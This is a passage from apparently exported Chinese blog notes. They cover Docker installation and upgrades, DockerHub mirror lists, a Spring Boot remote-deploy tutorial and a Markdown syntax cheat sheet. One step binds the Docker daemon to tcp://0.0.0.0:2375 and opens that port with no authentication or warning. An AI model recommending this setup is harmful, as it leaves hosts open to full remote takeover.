install docker-compose\n    ```\n\n    如果出错\n\n    ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2020061322045958-1678135240557-77-1680604004355-18.png)\n\n    就更新一下 six\n\n    ```sh\n    pip3 install six --user -U\n    ```\n\n- 查看docker-compose版本\n\n    ```sh\n    docker-compose --version\n    ```\n\n\n\n\n\n## 12. [DockerHub国内镜像源列表](https://gist.github.com/y0ngb1n/7e8f16af3242c7815e7ca2f0833d3ea6)\n\n此列表只收录无需限定条件的DockerHub镜像源，感谢这些公益服务者。\n\n**2024年6月18日 亲测可用**\n\n| DockerHub镜像仓库                                            | 镜像加速器地址                   |\n| ------------------------------------------------------------ | -------------------------------- |\n| [Docker镜像加速站](https://hub.uuuadc.top/)                  | `https://hub.uuuadc.top/`        |\n|                                                              | `docker.1panel.live`             |\n|                                                              | `hub.rat.dev`                    |\n| [DockerHub 镜像加速代理](https://docker.anyhub.us.kg/)       | `https://docker.anyhub.us.kg`    |\n|                                                              | `https://docker.chenby.cn`       |\n|                                                              | `https://dockerhub.jobcher.com/` |\n| [镜像使用说明](https://dockerhub.icu/)                       | `https://dockerhub.icu`          |\n| [Docker镜像加速站](https://docker.ckyl.me/)                  | `https://docker.ckyl.me`         |\n| [镜像使用说明](https://docker.awsl9527.cn/)                  | `https://docker.awsl9527.cn`     |\n| [镜像使用说明](https://docker.hpcloud.cloud/)                | `https://docker.hpcloud.cloud`   |\n| [AtomHub 可信镜像仓库平台 ](https://atomhub.openatom.cn/)（只包含基础镜像，共336个） | `https://atomhub.openatom.cn`    |\n| [DaoCloud 镜像站](https://github.com/DaoCloud/public-image-mirror) | `https://docker.m.daocloud.io`   |\n\n### 使用教程\n\n1. 为了加速镜像拉取，使用以下命令设置**registry mirror**\n\n> 支持系统：Ubuntu 16.04+、Debian 8+、CentOS 7+\n\n```\nsudo mkdir -p /etc/docker\nsudo tee /etc/docker/daemon.json <<EOF\n{\n    \"registry-mirrors\": [\n        \"https://hub.uuuadc.top\",\n        \"https://docker.anyhub.us.kg\",\n        \"https://dockerhub.jobcher.com\",\n        \"https://dockerhub.icu\",\n        \"https://docker.ckyl.me\",\n        \"https://docker.awsl9527.cn\"\n    ]\n}\nEOF\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n```\n\n1. 使用DockerHub Proxy，以下以 `hub.uuuadc.top` 为例：可以根据列表自行替换\n\n```\ndocker pull hub.uuuadc.top/library/mysql:5.7\n```\n\n说明：library是一个特殊的命名空间，它代表的是官方镜像。如果是某个用户的镜像就把library替换为镜像的用户名\n\n# docker-compose.yml 版本\n\n| Compose file format | Docker Engine release |\n| ------------------- | --------------------- |\n| 3.8                 | 19.03.0+              |\n| 3.7                 | 18.06.0+              |\n| 3.6                 | 18.02.0+              |\n| 3.5                 | 17.12.0+              |\n| 3.4                 | 17.09.0+              |\n| 3.3                 | 17.06.0+              |\n| 3.2                 | 17.04.0+              |\n| 3.1                 | 1.13.1+               |\n| 3                   | 1.13.0+               |\n| 2.4                 | 17.12.0+              |\n| 2.3                 | 17.06.0+              |\n| 2.2                 | 1.13.0+               |\n| 2.1                 | 1.12.0+               |\n| 2                   | 1.10.0+               |\n| 1                   | 1.9.1.+               |\n\n\n\n","tags":["Docker"],"categories":["Docker"]},{"title":"Docker日常使用记录","url":"/20250619/868b0954.html","content":"\n# Docker 升级到最新版本\n\n## 升级步骤\n\n### 1、查看系统要求\n\nDocker 要求 CentOS 系统的内核版本高于 3.10 ,查看CentOS的内核版本。\n\n```\nuname -a\n```\n\n### 2、删除旧版本\n\n```sh\nyum remove docker  docker-common docker-selinux docker-engine\n```\n\n### 3、安装需要的软件包\n\nyum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的\n\n```sh\nsudo yum install -y yum-utils device-mapper-persistent-data lvm2\n```\n\n### 4、设置Docker yum源\n\n```sh\nsudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo\n```\n\n### 5、查看所有仓库中所有docker版本\n\n可以查看所有仓库中所有docker版本,并选择特定的版本安装。\n\n```sh\nsudo yum install docker-ce-18.06.1.ce  \n```\n\n### 7、启动\n\n设置为开机启动\n\n```sh\nsystemctl enable docker\n```\n\n启动\n\n```sh\nsystemctl start docker\n```\n\n查看启动状态\n\n```sh\nsystemctl status docker\n```\n\n查看版本\n\n```sh\ndocker version\n```\n\n\n\n## 升级过程中的问题\n\n1. 容器报错Unknown runtime specified docker-run\n\n```html\n[root@nginx discourse]# grep -rl 'docker-runc' /var/lib/docker/containers/ | xargs sed -i 's/docker-runc/runc/g'\n[root@wxb-h5-weixin discourse]# systemctl restart docker\n```\n\n# 迁移Docker默认存储目录\n\nDocker默认路径存储空间不足，迁移Docker默认存储目录\n\n## 关掉所有正在运行的容器\n\n```sh\n# 关闭docker服务\ndocker stop $(docker ps -q -f status=running)\nsystemctl stop docker\n\n# 将Docker现目录挪到一个新目录下，这两个目录依照具体情况而定，我的分别是/var/lib/docker和/home/docker\nmv /var/lib/docker /home/docker\n\n将原来的数据备份一份，备份大法好，万一不行还不至于损坏数据\n\ncd /home\ntar zcf docker_file_bak.tar.gz /home/docker\n```\n\n## 修改启动文件\n\n```sh\n# 修改服务启动命令，服务的service文件为/lib/systemd/system/docker.service，将里面的内容ExecStart=/usr/bin/dockerd修改为如下：\n\nExecStart=/usr/bin/dockerd -g /home/docker\n\n# 重新加载修改后的service文件\nsystemctl daemon-reload\n```\n\n## 重启\n\n```sh\n# 启动Docker服务\nsystemctl start docker\n\n验证修改成功\ndocker info | grep \"Docker Root Dir\"\n```\n\n# [IDEA远程一键部署Springboot到Docker](https://juejin.cn/post/6844903865192562696)\n\n## 一、开发前准备\n\n#### 1. Docker的安装可以参考https://docs.docker.com/install/\n\n#### 2. 配置docker远程连接端口\n\n```sh\n  vi /usr/lib/systemd/system/docker.service\n```\n\n找到 **ExecStart**，在最后面添加 **-H tcp://0.0.0.0:2375**，如下图所示\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5152965b0277atplv-t2oaga2asx-zoom-in-crop-mark1304000.webp) \n\n#### 3. 重启docker\n\n```sh\nsystemctl stop docker\nsystemctl start docker\n```\n\n#### 4. 开放端口\n\n```sh\nfirewall-cmd --zone=public --add-port=2375/tcp --permanent\n```\n\n#### 5. Idea安装插件,重启\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5155b235261e1tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp) \n\n#### 6. 连接远程docker\n\n####    (1) 编辑配置\n\n\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5156207039d0etplv-t2oaga2asx-zoom-in-crop-mark1304000.webp)    \n\n![image-20220315094629072](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220315094629072.png) \n\n####    (3) 连接成功，会列出远程docker容器和镜像\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5156db1f07008tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp) \n\n## 二、新建项目\n\n#### 1. 创建springboot项目\n\n     项目结构图\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b51572f7be11e0tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp) \n\n\n\n####   (1) 配置pom文件\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>docker-demo</groupId>\n    <artifactId>com.demo</artifactId>\n    <version>1.0-SNAPSHOT</version>\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.0.2.RELEASE</version>\n        <relativePath />\n    </parent>\n\n    <properties>\n         <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n         <project.reporting.outputEncoding>UTF-8</project.reporting.outputEncoding>\n         <docker.image.prefix>com.demo</docker.image.prefix>\n         <java.version>1.8</java.version>\n    </properties>\n    <build>\n        <plugins>\n          <plugin>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-maven-plugin</artifactId>\n          </plugin>\n        <plugin>\n           <groupId>com.spotify</groupId>\n           <artifactId>docker-maven-plugin</artifactId>\n           <version>1.0.0</version>\n           <configuration>\n              <dockerDirectory>src/main/docker</dockerDirectory>\n              <resources>\n                <resource>\n                    <targetPath>/</targetPath>\n                    <directory>${project.build.directory}</directory>\n                    <include>${project.build.finalName}.jar</include>\n                </resource>\n              </resources>\n           </configuration>\n        </plugin>\n        <plugin>\n            <artifactId>maven-antrun-plugin</artifactId>\n            <executions>\n                 <execution>\n                     <phase>package</phase>\n                    <configuration>\n                        <target>\n                            <copy todir=\"src/main/docker\" file=\"target/${project.artifactId}-${project.version}.${project.packaging}\"></copy>\n                        </target>\n                     </configuration>\n                    <goals>\n                        <goal>run</goal>\n                    </goals>\n                    </execution>\n            </executions>\n        </plugin>\n       </plugins>\n    </build>\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-web</artifactId>\n    </dependency>\n    <dependency>\n  <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-test</artifactId>\n        <scope>test</scope>\n    </dependency>\n    <dependency>\n        <groupId>log4j</groupId>\n        <artifactId>log4j</artifactId>\n        <version>1.2.17</version>\n    </dependency>\n</dependencies>\n</project>\n```\n\n####   (2) 在src/main目录下创建docker目录，并创建Dockerfile文件\n\n```sh\nFROM openjdk:8-jdk-alpine\nADD *.jar app.jar\nENTRYPOINT [\"java\",\"-Djava.security.egd=file:/dev/./urandom\",\"-jar\",\"/app.jar\"]\n```\n\n####   (3) 在resource目录下创建application.properties文件\n\n```properties\nlogging.config=classpath:logback.xml\nlogging.path=/home/developer/app/logs/\nserver.port=8990\n```\n\n####   (4) 创建DockerApplication文件\n\n```java\n@SpringBootApplication\npublic class DockerApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(DockerApplication.class, args);\n    }\n}\n```\n\n####   (5) 创建DockerController文件\n\n```java\n@RestController\npublic class DockerController {\n    static Log log = LogFactory.getLog(DockerController.class);\n\n    @RequestMapping(\"/\")\n    public String index() {\n        log.info(\"Hello Docker!\");\n        return \"Hello Docker!\";\n    }\n}\n```\n\n####   (6) 增加配置\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5161faed2393atplv-t2oaga2asx-zoom-in-crop-mark1304000.webp) \n\n\n\n![image-20220315095235903](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220315095235903.png) \n\n- **Image tag :** 指定镜像名称和**tag**，镜像名称为 **docker-demo**，**tag**\n- **Bind ports :** 绑定宿主机端口到容器内部端口。格式为[宿主机端口]:[容器内部端口]\n- **Bind mounts :** 将宿主机目录挂到到容器内部目录中。格式为[宿主机目录]:[容器内部目录]。这个springboot项目会将日志打印在容器 **/home/developer/app/logs/** 目录下，将宿主机目录挂载到容器内部目录后，那么日志就会持久化容器外部的宿主机目录中。\n\n#### (7) Maven打包\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5167788e14ee1tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp) \n\n\n\n\n\n####   (8) 运行\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b51679f663afe8tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp) \n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5167bec448fe4tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp) \n\n先pull基础镜像，然后再打包镜像，并将镜像部署到远程docker运行 \n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5168992f0d1f4tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp) \n\n这里我们可以看到镜像名称为docker-demo:1.1，docker容器为docker-server\n\n####   (9) 运行成功\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5168d1c05f997tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp) \n\n\n\n####   (10) 浏览器访问\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b5168ed469a871tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp) \n\n####   (11) 日志查看\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/16b516908d72a340tplv-t2oaga2asx-zoom-in-crop-mark1304000.webp) \n\n\n\n\n\n# 进入容器命令行\n\n```sh\ndocker container ls\ndocker exec -it 3052dd731d05  bash\n```\n\n\n\n# 查看容器内进程运行信息\n\n```sh\n# 获取容器ID \ndocker container ls|grep 7.0.0 \n# 查看进程信息\ndocker top ac6f540b3cd4\n```\n\n\n\n#  修改host映射\n\n```sh\n# Docker 修改host映射 https://cloud.tencent.com/developer/article/1175087\n> echo \"1.2.3.4 test.zt.ss.com\" >> /etc/hosts\n```\n\n","tags":["Docker"],"categories":["Docker"]},{"title":"Ubuntu 安装Docker","url":"/20250619/d288da69.html","content":"\n# 1.卸载旧版本Docker\n\n```sh\n#卸载旧版本docker\nsudo apt-get remove docker docker-engine docker-ce docker.io  \n\n#清空旧版docker占用的内存\nsudo apt-get remove --auto-remove docker\n\n#更新系统源\nsudo apt-get update\n```\n\n# 2.配置安装环境\n\n```sh\nsudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common\n```\n\n# 3. 添加阿里云的docker GPG密钥\n\n```sh\ncurl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -\n```\n\n# 4. 添加阿里镜像源\n\n```sh\nsudo add-apt-repository \"deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable\"\n\n#更新\nsudo apt-get update\n```\n\n# 5. 查看有哪些版本\n\n```sh\napt-cache madison docker-ce\n```\n\n[![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/20200613220949677.png)](https://img-blog.csdnimg.cn/20200613220949677.png)\n\n# 6. 安装最新版/指定版本\n\n```sh\n#安装最新版\nsudo apt-get install -y docker-ce\n\n#安装5:19.03.6~3-0~ubuntu-bionic版\nsudo apt-get install -y docker-ce=5:19.03.6~3-0~ubuntu-bionic\n```\n\n# 7. 重启Docker\n\n```sh\nsudo service docker restart\n#或者\nsudo systemctl restart docker\n```\n\n# 8. 查看Docke版本\n\n```sh\nsudo docker version\n```\n\n# 9. 配置阿里容器镜像加速器\n\n![配置阿里容器镜像加速器](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/3f08ca0f-65ec-427d-87f4-3f3d27fb6f52.png)\n\n- 针对Docker客户端版本大于 1.10.0 的用户\n\n- 修改daemon配置文件/etc/docker/daemon.json来使用加速器\n\n  ```json\n  创建配置文件目录\n  $ sudo mkdir /etc/docker\n  \n  编辑配置文件，如果文件不存在，以下命令会自动创建。\n  $ sudo nano /etc/docker/daemon.json\n  \n  将配置信息粘贴到配置文件中，配置信息为 json 格式，可以根据实际需要设置多个国内的镜像服务器。\n  {\n    \"registry-mirrors\": [\n      \"https://hub-mirror.c.163.com\",\n      \"https://mirror.baidubce.com\"\n    ]\n  }\n  ```\n\n- 重启 Docker 服务\n\n  ```sh\n  $ sudo systemctl daemon-reload \n  $ sudo systemctl restart docker\n  ```\n\n- 检查设置是否生效\n\n  ```sh\n  $ sudo docker info\n  \n  结果中显示了我们设置的镜像服务器地址，则说明设置已经生效，返回的信息类似下面这样：\n  \n  Registry Mirrors:\n   https://hub-mirror.c.163.com/\n  \n  ```\n\n  \n\n# 10. 运行hello-world验证docker-ce是否安装成功\n\n```sh\nsudo docker run hello-world\n```\n\n 安装成功显示\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/69c425d9-ff18-4d9d-ac66-2946ae3bd013.png) \n\n\n\n#  11. 安装docker-compose\n\n- 安装pip\n\n```sh\nsudo apt install python3-pip\n```\n\n- 更新一下库\n\n```sh\nsudo apt-get update\n```\n\n- 更新一下pip\n\n```sh\nsudo pip3 install --upgrade pip\n```\n\n- 安装docker-compose\n\n```sh\nsudo pip3 install docker-compose\n```\n\n- 如果出错\n\n  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2020061322045958.png) \n\n- 就更新一下 six\n\n```sh\npip3 install six --user -U\n```\n\n- 查看docker-compose版本\n\n```sh\ndocker-compose --version\n```\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/20200613220759470.png) ","tags":["操作系统","Docker"],"categories":["工具|部署","Ubuntu"]},{"title":"Markdown使用语法记录","url":"/20250619/ea43daec.html","content":"\n# 目录\n\n```markdown\n开头输入` [TOC]`， 根据标题生成目录\n```\n\n# 标题\n\n```markdown\n# 一级标题\n## 二级标题\n### 三级标题\n#### 四级标题\n##### 五级标题\n###### 六级标题\n```\n\n# 段落\n\n```markdown\n段落的换行是使用两个以上空格加上回车。\n```\n\n# 字体\n\n```markdown\n*斜体文本*\n**粗体文本**\n***粗斜体文本***\n_斜体文本_\n__粗体文本__\n___粗斜体文本___\n```\n\n# 分隔线\n\n```markdown\n三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。\n也可以在星号或是减号中间插入空格。\n下面每种写法都可以建立分隔线：\n\n***\n* * *\n*****\n- - -\n----------\n```\n\n# 删除线\n\n```markdown\n~~删除文字~~\n```\n\n# 高亮\n\n```markdown\n==highlight==\n```\n\n# 下划线\n\n```markdown\n<u>带下划线文本</u>\n```\n\n# 脚注\n\n```\n[^要注明的文本]\n\n\n举例：\n下面是要标记脚注[^脚注]的测试段落。可以在多个位置使用同一个脚注[^脚注]。脚注[^脚注]内容会自动到页面底部。\n[^脚注]:脚注说明内容，需要独立一行。下面一行空着。\n1\n2\n3\n再次使用同一个脚注[^脚注]\n\n```\n\n效果：\n下面是要标记脚注[^脚注]的测试段落。可以在多个位置使用同一个脚注[^脚注]。脚注[^脚注]内容会自动到页面底部。\n\n[^脚注]: 脚注说明内容，需要独立一行。下面一行空着。\n\n1\n2\n3\n再次使用同一个脚注[^脚注]\n\n# 无序列表\n\n```markdown\n星号(*)、加号(+)或是减号(-)作为列表标记，标记后面添加一个空格\n\n举例：\n\n* 第一项\n* 第二项\n* 第三项\n\n+ 第一项\n+ 第二项\n+ 第三项\n\n\n- 第一项\n- 第二项\n- 第三项\n```\n\n# 有序列表\n\n```markdown\n有序列表使用数字并加上 . 号来表示，如：\n\n1. 第一项\n2. 第二项\n3. 第三项\n```\n\n# 列表嵌套\n\n```markdown\n列表嵌套只需在子列表中的选项前面添加四个空格即可：\n举例：\n1. 第一项：\n    - 第一项嵌套的第一个元素\n    - 第一项嵌套的第二个元素\n2. 第二项：\n    - 第二项嵌套的第一个元素\n    - 第二项嵌套的第二个元素\n```\n\n# 区块\n\n```markdown\n段落开头使用 > 符号 ，然后后面紧跟一个空格符号：\n\n> 区块引用\n> 菜鸟教程\n> 学的不仅是技术更是梦想\n```\n\n> 最外层\n>\n> > 第一层嵌套\n> >\n> > > 第二层嵌套\n\n```markdown\n另外区块是可以嵌套的，一个 > 符号是最外层，两个 > 符号是第一层嵌套：\n\n> 最外层\n> > 第一层嵌套\n> > > 第二层嵌套\n\n```\n\n> 最外层\n>\n> > 第一层嵌套\n> >\n> > > 第二层嵌套\n\n# 区块中使用列表\n\n```markdown\n> 区块中使用列表\n> 1. 第一项\n> 2. 第二项\n> + 第一项\n> + 第二项\n> + 第三项\n```\n\n> 区块中使用列表\n>\n> 1. 第一项\n> 2. 第二项\n>\n> + 第一项\n> + 第二项\n> + 第三项\n\n# 复选框\n\n```markdown\n使用 - [ ] 和 - [x] 语法可以创建复选框，实现 todo-list 等功能。例如：\n\n - [x] 已完成事项\n - [ ] 待办事项1\n - [ ] 待办事项2\n```\n\n  - [ ] 已完成事项\n - [ ] 待办事项1\n - [x] 待办事项2\n\n# 列表中使用区块\n\n```markdown\n需要在 > 前添加四个空格的缩进。\n\n列表中使用区块实例如下：\n\n* 第一项\n    > 菜鸟教程\n    > 学的不仅是技术更是梦想\n* 第二项\n\n```\n\n* 第一项\n\n  > 菜鸟教程\n  > 学的不仅是技术更是梦想\n\n* 第二项\n\n# 段落中代码\n\n```markdown\n用 `代码内容` 包裹一段代码\n```\n\n用 `代码内容` 包裹一段代码\n\n# 代码区块\n\n```\n用 ``` 包裹一段代码。可以指定一种语言\n```\n\n举例如下：\n\n```javascript\n$(document).ready(function () {\n    alert('RUNOOB');\n});\n```\n\n\n# 链接\n\n```markdown\n1. [链接名称](链接地址)  ：[百度](www.baidu.com)\n2. <链接地址>  ：<www.baidu.com>  \n3. 我们可以通过变量来设置一个链接，变量赋值在文档末尾进行：\n\n这个链接用 1 作为网址变量 [Google][1]。这个链接用 runoob 作为网址变量 [Runoob][runoob]。下面要空一行\n\n然后在文档的结尾为变量赋值（网址）\n\n  [1]: http://www.google.com/\n  [runoob]: http://www.runoob.com/\n```\n\n\n\n+ [链接名称](www.baidu.com)\n\n+ <www.baidu.com>  \n\n+ 这个链接用 1 作为网址变量 [Google][1]。这个链接用 runoob 作为网址变量 [Runoob][runoob]。下面要空一行\n\n  [1]: http://www.google.com/\n  [runoob]: http://www.runoob.com/\n\n# 文档内部锚点引用\n\n```markdown\n# 标题\n\n----\n## 目录\n1. [目录1](#jump1)\n2. [目录2](#jump2)\n\n---\n### <span id=\"jump1\">1. 目录1</span>\n---\n### <span id=\"jump2\">2. 目录2</span>\n\n```\n\n\n\n\n\n# 图片\n\n```markdown\n![alt 属性文本](图片地址)\n\n![alt 属性文本](图片地址 \"图片的title属性文字\")\n\n\n开头一个感叹号 !\n接着一个方括号，里面放上图片的替代文字\n接着一个普通括号，里面放上图片的网址（最后还可以用引号包住并加上选择性的 'title' 属性的文字）\n\n\nMarkdown 还没有办法指定图片的高度与宽度，如果你需要的话，你可以使用普通的 <img> 标签。\n<img src=\"http://static.runoob.com/images/runoob-logo.png\" width=\"20%\">\n```\n\n如果希望图片左对齐，左对齐很简单，**单行图片的情况下在前面输入一个空格就解决了**，右对齐就需要靠css了\n\n# 表格\n\n```markdown\n|  表头   | 表头  |\n|  ----  | ----  |\n| 单元格  | 单元格 |\n| 单元格  | 单元格 |\n\n\n\n对齐方式\n\n我们可以设置表格的对齐方式：\n\n-: 设置内容和标题栏居右对齐。\n:- 设置内容和标题栏居左对齐。\n:-: 设置内容和标题栏居中对齐。\n```\n\n| 左对齐 | 右对齐 | 居中对齐 |\n| :----- | -----: | :------: |\n| 单元格 | 单元格 |  单元格  |\n| 单元格 | 单元格 |  单元格  |\n\n# 支持的 HTML 元素\n\n```markdown\n不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。\n\n目前支持的 HTML 元素有：\n<kbd> 定义键盘文本。它表示文本是从键盘上键入的\n<b> 加粗\n<i>斜体文本\n<em>呈现为被强调的文本\n<sup> 上标文本\n<sub> 下标文本\n<br> 换行\n<video src=\"xxx.mp4\" /> 引入视频\n```\n\n这是使用 <kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>Del</kbd> 重启电脑\n这是<b> 加粗</b>\n这是<i>斜体文本</i>\n这是<em>呈现为被强调的文本</em>\n这是<sup> 上标文本</sup>\n这是<sub> 下标文本</sub>\n这是<br> 换行\n\n# 转义\n\n```markdown\n使用反斜杠转义特殊字符\n    **文本加粗** \n    \\*\\* 正常显示星号 \\*\\*\n\nMarkdown 支持以下这些符号前面加上反斜杠来帮助插入普通的符号：\n\n    \\   反斜线\n    `   反引号\n    *   星号\n    _   下划线\n    {}  花括号\n    []  方括号\n    ()  小括号\n    #   井字号\n    +   加号\n    -   减号\n    .   英文句点\n    !   感叹号\n```\n\n# 公式\n\n```markdown\n当你需要在编辑器中插入数学公式时，可以使用两个美元符 $$ 包裹 TeX 或 LaTeX 格式的数学公式来实现\n```\n\n# 流程图、时序图(顺序图)、甘特图\n\n1. 横向流程图源码格式\n\n   ```\n   graph LR\n   A[方形] -->B(圆角)\n       B --> C{条件a}\n       C -->|a=1| D[结果1]\n       C -->|a=2| E[结果2]\n   ```\n\n   \n\n   ```mermaid\n   graph LR\n   A[方形] -->B(圆角)\n       B --> C{条件a}\n       C -->|a=1| D[结果1]\n       C -->|a=2| E[结果2]\n   ```\n\n   \n\n2. 竖向流程图源码格式：\n\n   ```\n   graph TD\n   A[方形] --> B(圆角)\n       B --> C{条件a}\n       C --> |a=1| D[结果1]\n       C --> |a=2| E[结果2]\n       F[竖向流程图]\n   ```\n\n   效果：\n\n   ```mermaid\n   graph TD\n   A[方形] --> B(圆角)\n       B --> C{条件a}\n       C --> |a=1| D[结果1]\n       C --> |a=2| E[结果2]\n       F[竖向流程图]\n   ```\n\n   \n\n   \n\n3. 标准流程图源码格式：\n\n   ```\n   st=>start: 开始框\n   op=>operation: 处理框\n   cond=>condition: 判断框(是或否?)\n   sub1=>subroutine: 子流程\n   io=>inputoutput: 输入输出框\n   e=>end: 结束框\n   st->op->cond\n   cond(yes)->io->e\n   cond(no)->sub1(right)->op\n   ```\n\n   效果：\n\n   \n\n   ```flow\n   st=>start: 开始框\n   op=>operation: 处理框\n   cond=>condition: 判断框(是或否?)\n   sub1=>subroutine: 子流程\n   io=>inputoutput: 输入输出框\n   e=>end: 结束框\n   st->op->cond\n   cond(yes)->io->e\n   cond(no)->sub1(right)->op\n   \n   ```\n\n\n4. 标准流程图源码格式（横向）：\n\n   ```\n   st=>start: 开始框\n   op=>operation: 处理框\n   cond=>condition: 判断框(是或否?)\n   sub1=>subroutine: 子流程\n   io=>inputoutput: 输入输出框\n   e=>end: 结束框\n   st(right)->op(right)->cond\n   cond(yes)->io(bottom)->e\n   cond(no)->sub1(right)->op\n   ```\n\n   ```flow\n   st=>start: 开始框\n   op=>operation: 处理框\n   cond=>condition: 判断框(是或否?)\n   sub1=>subroutine: 子流程\n   io=>inputoutput: 输入输出框\n   e=>end: 结束框\n   st(right)->op(right)->cond\n   cond(yes)->io(bottom)->e\n   cond(no)->sub1(right)->op\n   ```\n\n   \n\n5. UML时序图源码样例：\n\n   ```\n   对象A->对象B: 对象B你好吗?（请求）\n   Note right of 对象B: 对象B的描述\n   Note left of 对象A: 对象A的描述(提示)\n   对象B-->对象A: 我很好(响应)\n   对象A->对象B: 你真的好吗？\n   ```\n\n   \n\n   ```sequence\n   对象A->对象B: 对象B你好吗?（请求）\n   Note right of 对象B: 对象B的描述\n   Note left of 对象A: 对象A的描述(提示)\n   对象B-->对象A: 我很好(响应)\n   对象A->对象B: 你真的好吗？\n   ```\n\n   \n\n   6、UML时序图源码复杂样例：\n\n   ```\n   Title: 标题：复杂使用\n   对象A->对象B: 对象B你好吗?（请求）\n   Note right of 对象B: 对象B的描述\n   Note left of 对象A: 对象A的描述(提示)\n   对象B-->对象A: 我很好(响应)\n   对象B->小三: 你好吗\n   小三-->>对象A: 对象B找我了\n   对象A->对象B: 你真的好吗？\n   Note over 小三,对象B: 我们是朋友\n   participant C\n   Note right of C: 没人陪我玩\n   ```\n\n   \n\n   ```sequence\n   Title: 标题：复杂使用\n   对象A->对象B: 对象B你好吗?（请求）\n   Note right of 对象B: 对象B的描述\n   Note left of 对象A: 对象A的描述(提示)\n   对象B-->对象A: 我很好(响应)\n   对象B->小三: 你好吗\n   小三-->>对象A: 对象B找我了\n   对象A->对象B: 你真的好吗？\n   Note over 小三,对象B: 我们是朋友\n   participant C\n   Note right of C: 没人陪我玩\n   ```\n\n   \n\n   7、UML标准时序图样例：\n\n   ```\n   %% 时序图例子,-> 直线，->>实线箭头，-->虚线，-->>虚线箭头\n     sequenceDiagram\n       participant 张三\n       participant 李四\n       张三->王五: 王五你好吗？\n       loop 健康检查\n           王五->王五: 与疾病战斗\n       end\n       Note right of 王五: 合理 食物 <br/>看医生...\n       李四-->>张三: 很好!\n       王五->李四: 你怎么样?\n       李四-->王五: 很好!\n   ```\n\n   \n\n   ```mermaid\n   %% 时序图例子,-> 直线，->>实线箭头，-->虚线，-->>虚线箭头\n     sequenceDiagram\n       participant 张三\n       participant 李四\n       张三->王五: 王五你好吗？\n       loop 健康检查\n           王五->王五: 与疾病战斗\n       end\n       Note right of 王五: 合理 食物 <br/>看医生...\n       李四-->>张三: 很好!\n       王五->李四: 你怎么样?\n       李四-->王五: 很好!\n   ```\n\n\n\n\n   8、甘特图样例：\n\n   ```\n   %% 语法示例\n     gantt\n     dateFormat  YYYY-MM-DD\n     title 软件开发甘特图\n     section 设计\n     需求:done, des1, 2014-01-06,2014-01-08\n     原型 :active,  des2, 2014-01-09, 3d\n     UI设计:des3, after des2, 5d\n   未来任务:des4, after des3, 5d\n     section 开发\n     学习准备理解需求 :crit, done, 2014-01-06,24h\n     设计框架  :crit, done, after des2, 2d\n     开发:crit, active, 3d\n     未来任务:crit, 5d\n     耍  :2d\n     section 测试\n     功能测试:active, a1, after des3, 3d\n     压力测试 :after a1  , 20h\n     测试报告 : 48h\n   ```\n\n   \n\n   ```mermaid\n   %% 语法示例\n     gantt\n     dateFormat  YYYY-MM-DD\n     title 软件开发甘特图\n     section 设计\n     需求:done, des1, 2014-01-06,2014-01-08\n     原型 :active,  des2, 2014-01-09, 3d\n     UI设计:des3, after des2, 5d\n   未来任务:des4, after des3, 5d\n     section 开发\n     学习准备理解需求 :crit, done, 2014-01-06,24h\n     设计框架  :crit, done, after des2, 2d\n     开发:crit, active, 3d\n     未来任务:crit, 5d\n     耍  :2d\n     section 